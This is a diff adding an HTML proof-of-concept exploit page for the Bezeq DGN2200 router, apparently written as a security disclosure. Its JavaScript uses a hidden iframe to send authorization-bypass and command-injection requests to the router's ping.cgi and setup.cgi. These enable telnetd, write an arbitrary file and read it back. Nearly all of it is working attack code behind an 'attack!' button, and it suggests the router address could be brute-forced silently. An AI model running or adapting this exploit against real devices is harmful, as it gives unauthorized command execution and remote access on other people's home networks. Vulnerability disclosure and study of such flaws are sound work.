@@ -1,0 +1,88 @@
+<pre>
+Bezeq DGN2200 POC by 0x3d5157636b525761.
+========================================
+This will create a file on the router - "/tmp/0x3d5157636b525761".
+It will also open your telnetd on your router for you to enjoy (only from LAN).
+You can see the file if you login via telnet.
+This assumes that the router's LAN IPv4 is 10.0.0.138.
+Of course, this could be brute-forced (from a reasonable list) silently.
+
+Just click on the button below to start the attack.
+After the attack is done, you can try to access the router from within the LAN:
+# telnet 10.0.0.138
+# cat /tmp/0x3d5157636b525761
+
+Long live my cat, Sushi!
+
+      \    /\
+       )  ( ')
+      (  /  )
+       \(__)|
+
+</pre>
+<iframe id="elem" width="1" height="1" style="visibility:hidden;display:none"></iframe>
+<script language="javascript">
+var running = false;
+var ip = '10.0.0.138';
+var last_frame = '';
+function clear_frame()
+{
+	// Clear the frame after getting its content
+	var frame = document.getElementById('elem');
+	last_frame = frame.contentDocument || frame.contentWindow.document;
+	frame.src = '';
+	running = false;
+}
+function load_url_clear(url)
+{
+	// Set the frame's URL and asynchroniously clear it
+	running = true;
+	document.getElementById('elem').src = 'http://' + ip + '/' + url;
+	setTimeout(clear_frame, 300);
+}
+function run_cmd(command)
+{
+	// Build the URL and load it
+	// Vulnerabilities used: authorization bypass & command injection
+	var url = 'ping.cgi?IPAddr1=8&IPAddr2=8&IPAddr3=8&IPAddr4=8&ping=Ping&ess_=x&ping_IPAddr=`' + command + '`';
+	load_url_clear(url);
+}
+function read_file(path)
+{
+	// Build the URL and load it
+	// Vulnerabilities used: authorization bypass & command injection
+	var url = 'ping.cgi?IPAddr1=8&IPAddr2=8&IPAddr3=8&IPAddr4=8&ping=Ping&ess_=x&ping_IPAddr=1|echo PING `cat ' + path + '`';
+	load_url_clear(url);
+}
+
+function wait_for_clear()
+{
+	// Polling
+	while (running) {}
+}
+	
+function poc()
+{
+	// Disable the button
+	document.getElementById('btn').disabled = true;
+
+	alert(1);
+	
+	// Open telnetd for fun
+	load_url_clear('setup.cgi?todo=debug&ess_=x');
+	wait_for_clear();
+
+	alert(2);
+
+	// Write an arbitrary file
+	run_cmd('echo pwned>/tmp/0x3d5157636b525761');
+	wait_for_clear();
+
+	// Read the file to see it we got it
+	read_file('/tmp/0x3d5157636b525761');
+	wait_for_clear();
+	alert(last_frame);	
+}
+</script>
+<input type="button" id="btn" value="attack!" onClick="poc();">
+
